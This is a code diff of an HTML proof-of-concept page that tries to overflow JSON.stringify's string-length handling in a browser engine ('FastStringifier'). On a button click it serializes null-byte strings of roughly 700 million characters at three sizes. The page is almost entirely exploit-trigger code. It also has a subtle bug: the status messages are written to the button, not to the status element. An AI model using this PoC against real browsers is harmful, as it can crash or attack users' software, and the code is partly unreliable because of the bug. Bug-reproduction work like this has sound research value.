@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>FastStringifier Overflow PoC with Button</title>
+    <title>FastStringifier Overflow PoC v2</title>
     <style>
         #trigger {
             margin: 20px;
@@ -17,27 +17,43 @@
         #trigger:hover {
             background-color: #d32f2f;
         }
+        #status {
+            margin: 20px;
+            font-weight: bold;
+            color: darkred;
+        }
     </style>
 </head>
 <body>
-    <h1>FastStringifier Overflow PoC</h1>
+    <h1>FastStringifier Overflow PoC v2</h1>
     <p>Click the button to test string length overflow in JSON.stringify.</p>
     <button id="trigger">Trigger Overflow</button>
+    <div id="status">Idle...</div>
     <script>
+        const status = document.getElementById('trigger');
         document.getElementById('trigger').addEventListener('click', () => {
+            status.textContent = 'Attempting overflow...';
             try {
-                // Create large string (715,827,883 bytes)
-                const string = "\x00".repeat(715827883);
-                // Trigger overflow in JSON.stringify
-                JSON.stringify(string);
+                // Attempt 1: Original size (715,827,883 bytes, ~682MB)
+                const string1 = "\x00".repeat(715827883);
+                JSON.stringify(string1);
             } catch (e) {
-                // Silent catch for first attempt
+                status.textContent = 'Attempt 1 failed, trying next...';
             }
             try {
-                // Second attempt
-                const string = "\x00".repeat(715827883);
-                JSON.stringify(string);
-            } catch (e) {}
+                // Attempt 2: Slightly smaller size (700,000,000 bytes, ~667MB)
+                const string2 = "\x00".repeat(700000000);
+                JSON.stringify(string2);
+            } catch (e) {
+                status.textContent = 'Attempt 2 failed, trying final...';
+            }
+            try {
+                // Attempt 3: Alternative size (720,000,000 bytes, ~686MB)
+                const string3 = "\x00".repeat(720000000);
+                JSON.stringify(string3);
+            } catch (e) {
+                status.textContent = 'All attempts failed.';
+            }
         });
     </script>
 </body>
